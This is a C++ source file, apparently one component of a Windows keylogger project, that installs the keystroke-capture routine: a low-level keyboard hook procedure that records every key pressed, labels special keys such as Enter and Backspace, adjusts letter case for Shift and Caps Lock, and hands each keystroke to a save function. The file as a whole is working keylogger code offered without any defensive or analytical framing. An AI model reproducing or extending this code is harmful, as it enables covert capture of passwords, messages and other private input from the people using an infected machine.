#include "keylogger.h"
#include "save.h"
#include <iostream>
#include <string>

bool isCapsLockOn() {
    BYTE keyStates[256];
    GetKeyboardState(keyStates);
    return (keyStates[VK_CAPITAL] & 0x01) != 0;
}


bool isShift() {
	if ((GetKeyState(VK_SHIFT) & 0x8000) != 0)
		return true;
	else
		return false;
}

LRESULT __stdcall KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if(nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        std::string s;
        switch(pKeyboard->vkCode) {
            case(VK_BACK):
                s = "[BACKSPACE]";
                break;
            case(VK_RETURN):
                s = "[ENTER]";
                break;
            case(VK_SPACE):
                s = " ";
                break;
            case(VK_TAB):
                s = "[TAB]";
                break;
            case(VK_SHIFT):
                s = "[SHIFT]";
                break;
            case(VK_CONTROL):
                s = "[CTRL]";
                break;
            case(VK_MENU):
                s = "[ALT]";
                break;
            case(VK_CAPITAL):
                s = "[CAPSLOCK]";
                break;
            case(VK_ESCAPE):
                s = "[ESC]";
                break;
            case(VK_PRIOR):
                s = "[PAGEUP]";
                break;
            default:
                char c = MapVirtualKey(pKeyboard->vkCode, MAPVK_VK_TO_CHAR);
                if(isCapsLockOn() ^ isShift()) {
                    s = toupper(c);
                } else {
                    s = tolower(c);
                }
            break;
        }
        save(s);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
